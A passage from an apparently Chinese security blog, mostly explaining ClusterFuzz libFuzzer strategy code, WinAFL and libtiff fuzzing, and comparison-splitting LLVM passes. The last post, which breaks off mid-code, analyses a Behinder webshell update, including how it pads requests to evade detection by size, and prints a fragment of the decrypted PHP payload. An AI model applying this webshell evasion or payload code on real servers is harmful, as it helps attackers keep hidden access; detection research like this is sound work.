DATAFLOW_TRACING_STRATEGY对于有DFSAN构建的程序以及策略池中有DATAFLOW_TRACING_STRATEGY，先获取dataflow_binary_path（DFSAN的二进制fuzzer路径），之后判断dataflow_trace_dir是否存在，不存在就不执行这个策略了，存在则添加参数 -data_flow_trace=dataflow_trace_dir，后面再加参数-focus_function=auto，最后将策略的名字添加到fuzzing_strategies 123456789101112131415161718# Depends on the presense of DFSan instrumented build. dataflow_build_dir = environment.get_value(&apos;DATAFLOW_BUILD_DIR&apos;) use_dataflow_tracing = ( dataflow_build_dir and strategy_pool.do_strategy(strategy.DATAFLOW_TRACING_STRATEGY)) if use_dataflow_tracing: dataflow_binary_path = os.path.join( dataflow_build_dir, os.path.relpath(fuzzer_path, build_directory)) dataflow_trace_dir = dataflow_binary_path + DATAFLOW_TRACE_DIR_SUFFIX if os.path.exists(dataflow_trace_dir): arguments.append( &apos;%s%s&apos; % (constants.DATA_FLOW_TRACE_FLAG, dataflow_trace_dir)) arguments.append(&apos;%s%s&apos; % (constants.FOCUS_FUNCTION_FLAG, &apos;auto&apos;)) fuzzing_strategies.append(strategy.DATAFLOW_TRACING_STRATEGY.name) else: logs.log_warn( &apos;Dataflow trace is not found in dataflow build, skipping strategy.&apos;) use_dataflow_tracing = False CORPUS_MUTATION接下来是Generate new testcase mutations的 首先看看strategy_pool中是否有CORPUS_MUTATION_ML_RNN_STRATEGY或者CORPUS_MUTATION_RADAMSA_STRATEGY（ML_RNN的优先级高于RADAMSA），有的话is_mutations_run就为True is_mutations_run为True，先create_corpus_directory(‘mutations’)创建样本目录，之后生成样本，将使用的策略的名字添加到fuzzing_strategies，最后将new_testcase_mutations_directory添加到additional_corpus_dirs 1234567891011121314151617181920212223# Select a generator to attempt to use for existing testcase mutations. candidate_generator = engine_common.select_generator(strategy_pool, fuzzer_path) is_mutations_run = (not environment.is_ephemeral() and candidate_generator != engine_common.Generator.NONE) # Generate new testcase mutations using radamsa, etc. if is_mutations_run: new_testcase_mutations_directory = create_corpus_directory(&apos;mutations&apos;) generator_used = engine_common.generate_new_testcase_mutations( corpus_directory, new_testcase_mutations_directory, project_qualified_fuzzer_name, candidate_generator) # Add the used generator strategy to our fuzzing strategies list. if generator_used: if candidate_generator == engine_common.Generator.RADAMSA: fuzzing_strategies.append( strategy.CORPUS_MUTATION_RADAMSA_STRATEGY.name) elif candidate_generator == engine_common.Generator.ML_RNN: fuzzing_strategies.append(strategy.CORPUS_MUTATION_ML_RNN_STRATEGY.name) additional_corpus_dirs.append(new_testcase_mutations_directory) 策略的核心函数是generate_new_testcase_mutations，根据candidate_generator使用generate_new_testcase_mutations_using_radamsa（RADAMSA会随机选择corpus_directory中符合大小的样，循环编译2000次）或者generate_new_testcase_mutations_using_ml_rnn函数去生成新的样本，假如生成的样本的数量比原来多，才会返回true 1234567891011121314151617181920212223242526272829def generate_new_testcase_mutations(corpus_directory, new_testcase_mutations_directory, fuzzer_name, candidate_generator): &quot;&quot;&quot;Generate new testcase mutations, using existing corpus directory or other methods. Returns true if mutations are successfully generated using radamsa or ml rnn. A false return signifies either no generator use or unsuccessful generation of testcase mutations.&quot;&quot;&quot; generation_timeout = get_new_testcase_mutations_timeout() pre_mutations_filecount = shell.get_directory_file_count( new_testcase_mutations_directory) # Generate new testcase mutations using Radamsa. if candidate_generator == Generator.RADAMSA: generate_new_testcase_mutations_using_radamsa( corpus_directory, new_testcase_mutations_directory, generation_timeout) # Generate new testcase mutations using ML RNN model. elif candidate_generator == Generator.ML_RNN: generate_new_testcase_mutations_using_ml_rnn( corpus_directory, new_testcase_mutations_directory, fuzzer_name, generation_timeout) # If new mutations are successfully generated, return true. if shell.get_directory_file_count( new_testcase_mutations_directory) &gt; pre_mutations_filecount: return True return False RANDOM_MAX_LENGTH_STRATEGY这个就是最大长度策略，首先判断是否已经存在-max_len=参数了，存在就不做任何操作 假如不存在，则生成一个0到10000范围内的数，作为-max_len的值 1234567if strategy_pool.do_strategy(strategy.RANDOM_MAX_LENGTH_STRATEGY): max_len_argument = fuzzer_utils.extract_argument( existing_arguments, constants.MAX_LEN_FLAG, remove=False) if not max_len_argument: max_length = random.SystemRandom().randint(1, MAX_VALUE_FOR_MAX_LENGTH) arguments.append(&apos;%s%d&apos; % (constants.MAX_LEN_FLAG, max_length)) fuzzing_strategies.append(strategy.RANDOM_MAX_LENGTH_STRATEGY.name) RECOMMENDED_DICTIONARY_STRATEGY这是推荐字典策略，函数add_recommended_dictionary 1234if (strategy_pool.do_strategy(strategy.RECOMMENDED_DICTIONARY_STRATEGY) and add_recommended_dictionary(arguments, project_qualified_fuzzer_name, fuzzer_path)): fuzzing_strategies.append(strategy.RECOMMENDED_DICTIONARY_STRATEGY.name) add_recommended_dictionary就是从谷歌云下载recommended_dictionary.dict，假如原来有字典则与原来的字典合并，并使用合并后的字典 12345678910111213141516171819202122232425262728293031323334353637def add_recommended_dictionary(arguments, fuzzer_name, fuzzer_path): &quot;&quot;&quot;Add recommended dictionary from GCS to existing .dict file or create a new one and update the arguments as needed. This function modifies |arguments| list in some cases.&quot;&quot;&quot; recommended_dictionary_path = os.path.join( fuzzer_utils.get_temp_dir(), dictionary_manager.RECOMMENDED_DICTIONARY_FILENAME) dict_manager = dictionary_manager.DictionaryManager(fuzzer_name) try: # Bail out if cannot download recommended dictionary from GCS. if not dict_manager.download_recommended_dictionary_from_gcs( recommended_dictionary_path): return False except Exception as ex: logs.log_error( &apos;Exception downloading recommended dictionary:\\n%s.&apos; % str(ex)) return False # Bail out if the downloaded dictionary is empty. if not os.path.getsize(recommended_dictionary_path): return False # Check if there is an existing dictionary file in arguments. original_dictionary_path = fuzzer_utils.extract_argument( arguments, constants.DICT_FLAG) merged_dictionary_path = ( original_dictionary_path or dictionary_manager.get_default_dictionary_path(fuzzer_path)) merged_dictionary_path += MERGED_DICT_SUFFIX dictionary_manager.merge_dictionary_files(original_dictionary_path, recommended_dictionary_path, merged_dictionary_path) arguments.append(constants.DICT_FLAG + merged_dictionary_path) return True VALUE_PROFILE_STRATEGY这个简单，就是添加参数-use_value_profile=1，下面是帮助信息，应该是使用特殊的值来指导模糊测试 Experimental. Use value profile to guide fuzzing. 123if strategy_pool.do_strategy(strategy.VALUE_PROFILE_STRATEGY): arguments.append(constants.VALUE_PROFILE_ARGUMENT) fuzzing_strategies.append(strategy.VALUE_PROFILE_STRATEGY.name) FORK_STRATEGY这个是fork策略，从MAX_FUZZ_THREADS获取max_fuzz_threads，默认值是1， -fork=的参数是cpu的核心数除以max_fuzz_threads，最小为1 12345678910# Do not use fork mode for DFT-based fuzzing. This is needed in order to # collect readable and actionable logs from fuzz targets running with DFT. if (not is_fuchsia and not is_android and not is_ephemeral and not use_dataflow_tracing and strategy_pool.do_strategy(strategy.FORK_STRATEGY)): max_fuzz_threads = environment.get_value(&apos;MAX_FUZZ_THREADS&apos;, 1) num_fuzz_processes = max(1, utils.cpu_count() // max_fuzz_threads) arguments.append(&apos;%s%d&apos; % (constants.FORK_FLAG, num_fuzz_processes)) fuzzing_strategies.append( &apos;%s_%d&apos; % (strategy.FORK_STRATEGY.name, num_fuzz_processes)) MUTATOR_PLUGIN_STRATEGY这个是use_mutator_plugin函数通过设置extra_env[&#39;LD_PRELOAD&#39;] = mutator_plugin_path来生效的 1234extra_env = &#123;&#125;if (strategy_pool.do_strategy(strategy.MUTATOR_PLUGIN_STRATEGY) and use_mutator_plugin(target_name, extra_env)): fuzzing_strategies.append(strategy.MUTATOR_PLUGIN_STRATEGY.name) PEACH_GRAMMAR_MUTATION_STRATEGY12345if (not has_existing_mutator_strategy(fuzzing_strategies) and strategy_pool.do_strategy(strategy.PEACH_GRAMMAR_MUTATION_STRATEGY) and use_peach_mutator(extra_env, grammar)): fuzzing_strategies.append( &apos;%s_%s&apos; % (strategy.PEACH_GRAMMAR_MUTATION_STRATEGY.name, grammar)) 首先假如fuzzing_strategies已经有以下策略的其中一个，就不执行PEACH_GRAMMAR_MUTATION_STRATEGY策略了 12345MUTATOR_STRATEGIES = [ strategy.PEACH_GRAMMAR_MUTATION_STRATEGY.name, strategy.MUTATOR_PLUGIN_STRATEGY.name, strategy.MUTATOR_PLUGIN_RADAMSA_STRATEGY.name] PEACH_GRAMMAR_MUTATION_STRATEGY策略也是通过环境变量来生效的，在use_peach_mutator函数中主要是下面环境变量 12345678910111213# Set title and pit environment variables extra_env[&apos;PIT_FILENAME&apos;] = pit_path extra_env[&apos;PIT_TITLE&apos;] = grammar# Set LD_PRELOAD. peach_path = os.path.join(unzipped, &apos;peach_mutator&apos;, &apos;src&apos;, &apos;peach.so&apos;) extra_env[&apos;LD_PRELOAD&apos;] = peach_path# Set Python path. new_path = [ os.path.join(unzipped, &apos;peach_mutator&apos;, &apos;src&apos;), os.path.join(unzipped, &apos;peach_mutator&apos;, &apos;third_party&apos;, &apos;peach&apos;), ] + sys.path extra_env[&apos;PYTHONPATH&apos;] = os.pathsep.join(new_path) MUTATOR_PLUGIN_RADAMSA_STRATEGY这里的逻辑也是跟上面一样，MUTATOR_STRATEGIES其中之一已经存在，就不执行策略了 1234if (not has_existing_mutator_strategy(fuzzing_strategies) and strategy_pool.do_strategy(strategy.MUTATOR_PLUGIN_RADAMSA_STRATEGY) and use_radamsa_mutator_plugin(extra_env)): fuzzing_strategies.append(strategy.MUTATOR_PLUGIN_RADAMSA_STRATEGY.name) use_radamsa_mutator_plugin函数就是通过环境变量LD_PRELOAD生效的，extra_env[&#39;LD_PRELOAD&#39;] = radamsa_path 123456789101112131415def use_radamsa_mutator_plugin(extra_env): &quot;&quot;&quot;Decide whether to use Radamsa in process. If yes, add the path to the radamsa shared object to LD_PRELOAD in |extra_env| and return True.&quot;&quot;&quot; # Radamsa will only work on LINUX ASAN jobs. # TODO(mpherman): Include architecture info in job definition and exclude # i386. if environment.is_lib() or not is_linux_asan(): return False radamsa_path = os.path.join(environment.get_platform_resources_directory(), &apos;radamsa&apos;, &apos;libradamsa.so&apos;) logs.log(&apos;Using Radamsa mutator plugin : %s&apos; % radamsa_path) extra_env[&apos;LD_PRELOAD&apos;] = radamsa_path return True libfuzzer.pick_strategies之后展开参数 1arguments.extend(strategy_info.arguments) 解压corpus 12# Check for seed corpus and add it into corpus directory.engine_common.unpack_seed_corpus_if_needed(target_path, corpus_dir) 假如策略里面有CORPUS_SUBSET_STRATEGY，选择一些数量的corpus作为初始的corpus 123456789101112131415# Pick a few testcases from our corpus to use as the initial corpus.subset_size = engine_common.random_choice( engine_common.CORPUS_SUBSET_NUM_TESTCASES)if (not strategy_info.use_dataflow_tracing and strategy_pool.do_strategy(strategy.CORPUS_SUBSET_STRATEGY) and shell.get_directory_file_count(corpus_dir) &gt; subset_size): # Copy |subset_size| testcases into &apos;subset&apos; directory. corpus_subset_dir = self._create_temp_corpus_dir(&apos;subset&apos;) libfuzzer.copy_from_corpus(corpus_subset_dir, corpus_dir, subset_size) strategy_info.fuzzing_strategies.append( strategy.CORPUS_SUBSET_STRATEGY.name + &apos;_&apos; + str(subset_size)) strategy_info.additional_corpus_dirs.append(corpus_subset_dir)else: strategy_info.additional_corpus_dirs.append(corpus_dir) 存在字典参数，检查字典文件参数，并检查字典是否存在 如果不存在字典参数，则检查%target_binary_name%.dict是否存在 最后还检查字典的格式并尝试修复，比如缺少双引号 123456789101112131415161718# Check dict argument to make sure that it&apos;s valid. dict_path = fuzzer_utils.extract_argument( arguments, constants.DICT_FLAG, remove=False) if dict_path and not os.path.exists(dict_path): logs.log_error(&apos;Invalid dict %s for %s.&apos; % (dict_path, target_path)) fuzzer_utils.extract_argument(arguments, constants.DICT_FLAG) # If there&apos;s no dict argument, check for %target_binary_name%.dict file. dict_path = fuzzer_utils.extract_argument( arguments, constants.DICT_FLAG, remove=False) if not dict_path: dict_path = dictionary_manager.get_default_dictionary_path(target_path) if os.path.exists(dict_path): arguments.append(constants.DICT_FLAG + dict_path) # If we have a dictionary, correct any items that are not formatted properly # (e.g. quote items that are missing them). dictionary_manager.correct_if_needed(dict_path) prepare函数最后调用process_strategies，返回一个stats，哪个策略开没开，或者策略选择的值，就是strategies变量 123456strategies = stats.process_strategies( strategy_info.fuzzing_strategies, name_modifier=lambda x: x) return LibFuzzerOptions( corpus_dir, arguments, strategies, strategy_info.additional_corpus_dirs, strategy_info.extra_env, strategy_info.use_dataflow_tracing, strategy_info.is_mutations_run) fuzz的最大时间从环境变量获取要fuzz的时长，减去在fuzz中的其他操作的时间，比如合并样本，字典分析等 12345678fuzz_test_timeout = environment.get_value(&apos;FUZZ_TEST_TIMEOUT&apos;)additional_processing_time = engine_impl.fuzz_additional_processing_timeout( options)fuzz_test_timeout -= additional_processing_timeif fuzz_test_timeout &lt;= 0: raise FuzzTaskException( f&apos;Invalid engine timeout: &apos; f&apos;&#123;fuzz_test_timeout&#125; - &#123;additional_processing_time&#125;&apos;) 实际fuzz实际fuzz就是下面这行 12result = engine_impl.fuzz(target_path, options, testcase_directory, fuzz_test_timeout) 跟进这个fuzz函数 下面的第一行profiler是性能分析相关的，假如设置了USE_PYTHON_PROFILER，并且不是False，就会启动Google Cloud Profiler 第二行就是通过libfuzzer.get_runner一般正常情况是返回的是LibFuzzerRunner(fuzzer_path) 第三行是设置sanitizer_options，比如exitcode为77 第四行创建一个临时的目录作为corpus的目录，之后地5行跟options.fuzz_corpus_dirs合并变成一个corpus_directories数组 之后调用runner.fuzz，就是实际起fuzz了 fuzz之后就简单概括下：1、将fuzzer的输出splitlines2、根据log看看有没有crash，并提取crash的文件的路径3、如果libfuzzer的返回值非0，但是又没找到crash文件，那么这个应该是启动的时候就崩溃了，这时使用空文件作为crash文件4、根据log_lines的信息，设置一些stats的值，比如crash_count，slow_unit_count，timeout_count，edges_total等5、删除一些影响merge和字典分析的参数，比如-fork，-max_len，-runs等6、给复现crash设置更大的超时时间7、复制crash文件到主crash目录8、从log中生成推荐字典9、返回fuzz的结果 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980profiler.start_if_needed(&apos;libfuzzer_fuzz&apos;) runner = libfuzzer.get_runner(target_path) libfuzzer.set_sanitizer_options(target_path, fuzz_options=options) # Directory to place new units. new_corpus_dir = self._create_temp_corpus_dir(&apos;new&apos;) corpus_directories = [new_corpus_dir] + options.fuzz_corpus_dirs fuzz_result = runner.fuzz( corpus_directories, fuzz_timeout=max_time, additional_args=options.arguments, artifact_prefix=reproducers_dir, extra_env=options.extra_env)log_lines = fuzz_result.output.splitlines() # Output can be large, so save some memory by removing reference to the # original output which is no longer needed. fuzz_result.output = None # Check if we crashed, and get the crash testcase path. crash_testcase_file_path = runner.get_testcase_path(log_lines) # If we exited with a non-zero return code with no crash file in output from # libFuzzer, this is most likely a startup crash. Use an empty testcase to # to store it as a crash. if not crash_testcase_file_path and fuzz_result.return_code: crash_testcase_file_path = self._create_empty_testcase_file( reproducers_dir) # Parse stats information based on libFuzzer output. parsed_stats = libfuzzer.parse_log_stats(log_lines) # Extend parsed stats by additional performance features. parsed_stats.update( stats.parse_performance_features(log_lines, options.strategies, options.arguments)) # Set some initial stat overrides. timeout_limit = fuzzer_utils.extract_argument( options.arguments, constants.TIMEOUT_FLAG, remove=False) expected_duration = runner.get_max_total_time(max_time) actual_duration = int(fuzz_result.time_executed) fuzzing_time_percent = 100 * actual_duration / float(expected_duration) parsed_stats.update(&#123; &apos;timeout_limit&apos;: int(timeout_limit), &apos;expected_duration&apos;: expected_duration, &apos;actual_duration&apos;: actual_duration, &apos;fuzzing_time_percent&apos;: fuzzing_time_percent, &#125;) # Remove fuzzing arguments before merge and dictionary analysis step. merge_arguments = options.arguments[:] libfuzzer.remove_fuzzing_arguments(merge_arguments, is_merge=True) self._merge_new_units(target_path, options.corpus_dir, new_corpus_dir, options.fuzz_corpus_dirs, merge_arguments, parsed_stats) fuzz_logs = &apos;\\n&apos;.join(log_lines) crashes = [] if crash_testcase_file_path: reproduce_arguments = options.arguments[:] libfuzzer.remove_fuzzing_arguments(reproduce_arguments) # Use higher timeout for reproduction. libfuzzer.fix_timeout_argument_for_reproduction(reproduce_arguments) # Write the new testcase. # Copy crash testcase contents into the main testcase path. crashes.append( engine.Crash(crash_testcase_file_path, fuzz_logs, reproduce_arguments, actual_duration)) libfuzzer.analyze_and_update_recommended_dictionary( runner, project_qualified_fuzzer_name, log_lines, options.corpus_dir, merge_arguments) return engine.FuzzResult(fuzz_logs, fuzz_result.command, crashes, parsed_stats, fuzz_result.time_executed) 最后进去runner.fuzz函数看看，首先找到LibFuzzerRunner，发现fuzz函数实际调用的是LibFuzzerCommon.fuzz 12345678910111213141516171819202122232425class LibFuzzerRunner(new_process.UnicodeProcessRunner, LibFuzzerCommon): &quot;&quot;&quot;libFuzzer runner (when minijail is not used).&quot;&quot;&quot; def __init__(self, executable_path, default_args=None): &quot;&quot;&quot;Inits the LibFuzzerRunner. Args: executable_path: Path to the fuzzer executable. default_args: Default arguments to always pass to the fuzzer. &quot;&quot;&quot; super().__init__(executable_path=executable_path, default_args=default_args) def fuzz(self, corpus_directories, fuzz_timeout, artifact_prefix=None, additional_args=None, extra_env=None): &quot;&quot;&quot;LibFuzzerCommon.fuzz override.&quot;&quot;&quot; additional_args = copy.copy(additional_args) if additional_args is None: additional_args = [] return LibFuzzerCommon.fuzz(self, corpus_directories, fuzz_timeout, artifact_prefix, additional_args, extra_env) 找到LibFuzzerCommon.fuzz，里面处理了一下-artifact_prefix ，加上-max_total_time=和-print_final_stats=1，最后再加corpus_directories列表，最后就调用run_and_wait函数了（就是最多等待fuzz_timeout时间就退出，或者libfuzzer自动退出） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354def fuzz(self, corpus_directories, fuzz_timeout, artifact_prefix=None, additional_args=None, extra_env=None): &quot;&quot;&quot;Running fuzzing command. Args: corpus_directories: List of corpus directory paths to be passed to libFuzzer. fuzz_timeout: The maximum time in seconds that libFuzzer is allowed to run for. artifact_prefix: The directory to store new fuzzing artifacts (crashes, timeouts, slow units) additional_args: A sequence of additional arguments to be passed to the executable. extra_env: A dictionary containing environment variables and their values. These will be added to the environment of the new process. Returns: A process.ProcessResult. &quot;&quot;&quot; additional_args = copy.copy(additional_args) if additional_args is None: additional_args = [] max_total_time = self.get_max_total_time(fuzz_timeout) if any(arg.startswith(constants.FORK_FLAG) for arg in additional_args): max_total_time -= self.LIBFUZZER_FORK_MODE_CLEAN_EXIT_TIME assert max_total_time &gt; 0 # Old libFuzzer jobs specify -artifact_prefix through additional_args if artifact_prefix: additional_args.append( &apos;%s%s&apos; % (constants.ARTIFACT_PREFIX_FLAG, self._normalize_artifact_prefix(artifact_prefix))) additional_args.extend([ &apos;%s%d&apos; % (constants.MAX_TOTAL_TIME_FLAG, max_total_time), constants.PRINT_FINAL_STATS_ARGUMENT, # FIXME: temporarily disabled due to a lack of crash information in # output. # &apos;-close_fd_mask=3&apos;, ]) additional_args.extend(corpus_directories) return self.run_and_wait( additional_args=additional_args, timeout=fuzz_timeout - self.SIGTERM_WAIT_TIME, terminate_before_kill=True, terminate_wait_time=self.SIGTERM_WAIT_TIME, max_stdout_len=MAX_OUTPUT_LEN, extra_env=extra_env)","categories":[],"tags":[{"name":"集群fuzz","slug":"集群fuzz","permalink":"https://www.giantbranch.cn/tags/集群fuzz/"},{"name":"ClusterFuzz","slug":"ClusterFuzz","permalink":"https://www.giantbranch.cn/tags/ClusterFuzz/"}]},{"title":"winafl编译与测试","slug":"winafl编译与测试","date":"2020-12-25T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2020/12/25/winafl编译与测试/","link":"","permalink":"https://www.giantbranch.cn/2020/12/25/winafl编译与测试/","excerpt":"","text":"实验环境 Visual Studio 2017 （你也可用更加新的版本）gitperlcmakegitwindows 10DynamoRIO-Windows-8.0.0-1.zip 注意好像win10需要DynamoRIO 8.0.0以上 上面的都搞好后，下载winafl 1git clone --recursive https://github.com/googleprojectzero/winafl.git 编译32位，打开x86，64位打开x86_x64 以64为例 123456789D:\\Program Files (x86)\\Microsoft Visual Studio&gt;cd D:\\Temp\\test\\winaflD:\\Temp\\test\\winafl&gt;mkdir build64D:\\Temp\\test\\winafl&gt;cd build64D:\\Temp\\test\\winafl\\build64&gt;cmake -G&quot;Visual Studio 15 2017&quot; -A x64 .. -DDynamoRIO_DIR=D:\\Temp\\DynamoRIO-Windows-8.0.0-1\\cmake -DINTELPT=1D:\\Temp\\test\\winafl\\build64&gt;cmake --build . --config Release 程序就在build64\\bin\\Release里面 使用test_gdiplus.exe进行测试，通过ida查看main函数是sub_1400010E0，偏移是0x10e0，这个编译器不同，偏移肯定不同 再搞一个1.bmp的测试文件 先用drrun测试一下，没有报错 1D:\\Temp\\DynamoRIO-Windows-8.0.0-1\\bin64\\drrun.exe -c winafl.dll -debug -target_module test_gdiplus.exe -target_offset 0x10e0 -fuzz_iterations 5 -nargs 2 -- test_gdiplus.exe 1.bmp 还生成了一个log，那基本应该没啥问题了 那可以上afl了，新建一个in目录，放1.bmp进去 1afl-fuzz.exe -i in -o out -D D:\\Temp\\DynamoRIO-Windows-8.0.0-1\\bin64\\ -t 20000 -- -coverage_module gdiplus.dll -target_module test_gdiplus.exe -target_offset 0x10e0 -fuzz_iterations 20 -nargs 2 -- test_gdiplus.exe @@","categories":[],"tags":[{"name":"afl","slug":"afl","permalink":"https://www.giantbranch.cn/tags/afl/"},{"name":"winafl","slug":"winafl","permalink":"https://www.giantbranch.cn/tags/winafl/"}]},{"title":"通过编译器转换(llvm pass)规避模糊测试的一些障碍","slug":"通过编译器转换(llvm pass)规避模糊测试的一些障碍","date":"2020-09-08T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2020/09/08/通过编译器转换(llvm pass)规避模糊测试的一些障碍/","link":"","permalink":"https://www.giantbranch.cn/2020/09/08/通过编译器转换(llvm pass)规避模糊测试的一些障碍/","excerpt":"","text":"这个是看一个文章的记录，算是简译吧 总的来说是通过llvm pass去优化代码的生成去提高AFL的代码覆盖率 AFL通过插桩获取的代码覆盖率，假如变异的样本触发的新的路径，就会加入到接下来的变异队列中 但是有一些情况，会给afl造成极大的障碍 12345if (input == 0xabad1dea) &#123; /* terribly buggy code */&#125; else &#123; /* secure code */&#125; afl是随机变异的，去变异生成一个完全一样的4字节的数，真是难于上青天 那怎么解决这个问题呢？ 假如把上面的代码换成下面那样 1234567891011121314if (input &gt;&gt; 24 == 0xab)&#123; if ((input &amp; 0xff0000) &gt;&gt; 16 == 0xad) &#123; if ((input &amp; 0xff00) &gt;&gt; 8 == 0x1d) &#123; if ((input &amp; 0xff) == 0xea) &#123; /* terrible code */ goto end; &#125; &#125; &#125;&#125;/* good code */end: 现在一次比较一个字节，大大提升了中奖概率，从1/2^32降低到了1/2^9，即1/512 原文作者根据这个原理，把可能出现这个问题两种情况也写了pass：switch的选项，还有比较函数（memcmp，strcmp …） LLVM Passes作者共实现了3个pass 比较指令的：split-compares-passstrcmp和memcmp的： compare-transform-passswitch的：split-switches-pass The split-compares-pass其实除了有==,还有!=,&gt;,&lt;,&gt;=,&lt;= 首先把&gt;=,&lt;=这种拆分为两个，比如&gt;=，一个是==，另一个是&gt; 再将有符号的比较拆分为，符号位比较和无符号的比较 到这就只剩这四种比较了：&lt;, &gt;, ==, != ，而且都是无符号的，所以再将字符拆分成单字节就好了 The compare-transform-pass原始 123if(!strcmp(directive, &quot;crash&quot;)) &#123; programbug()&#125; 改成一个一个比较 12345678if(directive[0] == &apos;c&apos;) &#123; if(directive[1] == &apos;r&apos;) &#123; if(directive[2] == &apos;a&apos;) &#123; if(directive[3] == &apos;s&apos;) &#123; if(directive[4] == &apos;h&apos;) &#123; if(directive[5] == 0) &#123; programbug()&#125; 局限性：就是这个比较是文字字符串并且因此字符串本身及其长度在编译时已知 The split-switches-pass1234567891011int x = userinput();switch(x) &#123; case 0x11ff: /* handle case 0x11ff */ break; case 0x22ff: /* handle case 0x22ff */ break; default: /* handle default */&#125; 思想是想转化为if else，之后在通过split-compares-pass来处理，但这可能不是生成最优代码 12345678910111213141516171819202122232425262728293031if (x &gt;&gt; 24 == 0x00)&#123; if ((x &amp; 0xff0000) &gt;&gt; 16 == 0x00) &#123; if ((x &amp; 0xff00) &gt;&gt; 8 == 0x11) &#123; if ((x &amp; 0xff) == 0xff) &#123; /* case 0x11ff */ goto after_switch; &#125; goto default_case; &#125; goto default_case; &#125; goto default_case;&#125;else if (x &gt;&gt; 24 == 0x00)&#123; if ((x &amp; 0xff0000) &gt;&gt; 16 == 0x00) &#123; if ((x &amp; 0xff00) &gt;&gt; 8 == 0x22) &#123; if ((x &amp; 0xff) == 0xff) &#123; /* case 0x22ff */ goto after_switch; &#125; goto default_case; &#125; goto default_case; &#125; goto default_case;&#125;default_case: /* default case */after_switch: 评价作者还用libpng和harfbuzz对着几个pass进行了测试 Driller的test case12345678910111213141516171819202122232425 1 int main(void) &#123; 2 config_t* config = readconfig(); 3 if(config == NULL)&#123; 4 puts(&quot;Configuration syntax error&quot;); 5 return 1; 6 &#125; 7 if (config-&gt;magic != MAGICNUMBER) &#123; 8 puts(&quot;Bad magic number&quot;); 9 return 2;10 &#125;11 initialize(config);1213 char* directive = config-&gt;directives[0];14 if(!strcmp(directive, &quot;crashstring&quot;)) &#123;15 programbug();16 &#125;17 else if(!strcmp(directive, &quot;setoption&quot;)) &#123;18 setoption(config-&gt;directives[1]);19 &#125;20 else&#123;21 _default();22 &#125;23 24 return 0;25 &#125; 有了pass，1分钟就通过了第7行的检查，60分钟生成了crashstring，但是最后没出来setoption 没有pass，可能在合理的时间都过不了第7行的检查 libpng作者将afl分为两组 组A：1个master，3个slave，都是正常插桩组B：1个master，1个slave，都是正常插桩，还有另外的，1个master，1个slave，都是加了pass的 A组发现了1459条路径B找到了2318条路径。 在代码覆盖率方面（使用lcov进行度量的），A组命中了libpng的2186行，而B组命中了2707行 通过看图，可以看到加了pass，比较随便过 harfbuzzharfbuzz的测试设置与libpng的设置相同，但是测试仅运行了24小时。在测试结束时，A组发现2070条路径，而B组发现2150条路径。在代码覆盖率方面，A组达到3358行，而B组达到3474行，增长了3.5％。 效果还是比较明显的 参考原文https://lafintel.wordpress.com/2016/08/15/circumventing-fuzzing-roadblocks-with-compiler-transformations/","categories":[],"tags":[{"name":"afl","slug":"afl","permalink":"https://www.giantbranch.cn/tags/afl/"},{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.giantbranch.cn/tags/fuzzing/"},{"name":"llvm pass","slug":"llvm-pass","permalink":"https://www.giantbranch.cn/tags/llvm-pass/"}]},{"title":"使用afl来fuzz libtiff","slug":"使用afl来fuzz libtiff","date":"2020-08-25T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2020/08/25/使用afl来fuzz libtiff/","link":"","permalink":"https://www.giantbranch.cn/2020/08/25/使用afl来fuzz libtiff/","excerpt":"","text":"源码下载： http://download.osgeo.org/libtiff/ 编译： 1234export CC=afl-clang-fastexport CXX=afl-clang-fast++./configure --disable-sharedmake 我们确定目标是fuzz tiff2pdf 下载测试用例 1wget https://lcamtuf.coredump.cx/afl/demo/afl_testcases.tgz 我们使用afl_testcases/tiff/full/images里面的即可 最小化测试用例 1afl-cmin -i testcase_full -o testcase_cmin ./tools/tiff2pdf @@ /dev/null 最终6000多个减少到800个 1234567891011121314corpus minimization tool for afl-fuzz by &lt;lcamtuf@google.com&gt;[*] Testing the target binary...[+] OK, 101 tuples recorded.[*] Obtaining traces for input files in &apos;testcase_full&apos;... Processing file 6399/6399...[*] Sorting trace sets (this may take a while)...[+] Found 12057 unique tuples across 6399 files.[*] Finding best candidates for each tuple... Processing file 6399/6399...[*] Sorting candidate list (be patient)...[*] Processing candidates and writing output files... Processing tuple 12057/12057...[+] Narrowed down to 817 files, saved in &apos;testcase_cmin&apos;. 开fuzz 1afl-fuzz -i testcase_cmin/ -o afl_output/ tools/tiff2pdf @@ /dev/null","categories":[],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.giantbranch.cn/tags/fuzzing/"},{"name":"模糊测试","slug":"模糊测试","permalink":"https://www.giantbranch.cn/tags/模糊测试/"}]},{"title":"冰蝎 Behinder_v3.0 Beta 3 重点更新简析","slug":"冰蝎 Behinder_v3.0 Beta 3 重点更新简析","date":"2020-08-21T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2020/08/21/冰蝎 Behinder_v3.0 Beta 3 重点更新简析/","link":"","permalink":"https://www.giantbranch.cn/2020/08/21/冰蝎 Behinder_v3.0 Beta 3 重点更新简析/","excerpt":"","text":"17日刚分析出特征：冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测 19号就迅速更新了，下面是更新日志： 12345678910111213###2020.8.18 v3.0 Beta 3 更新日志1.增加了端口映射功能的稳定性；2.Java服务端支持Java6+；3.修复了PHP版本连接不上的问题，PHP版本支持为PHP5.3~PHP7.4；4.修复了aspx连接不上的问题；5.修复了asp版本无法连接的问题；6.请求体增加了随机冗余参数，避免防护设备通过请求体大小识别请求；7.更新了内置的UesrAgent列表；8.修复了请求体中cookie值携带cookie属性的问题；9.修该了Accept请求头；10.修复了某些环境下无法列目录的问题；11.修复了文件无法打开的问题。 重点是第6个，请求体增加了随机冗余参数，避免防护设备通过请求体大小识别请求； 之前可以通过长度来检测，现在就不行了 我们看看是怎么实现的，通过在shell.php解密，得到 第一次本来的加密UUID，现在变成随机的了 12345678910111213141516171819202122232425@error_reporting(0);function main($content)&#123; $result = array(); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($content); $key = $_SESSION[&apos;k&apos;]; echo 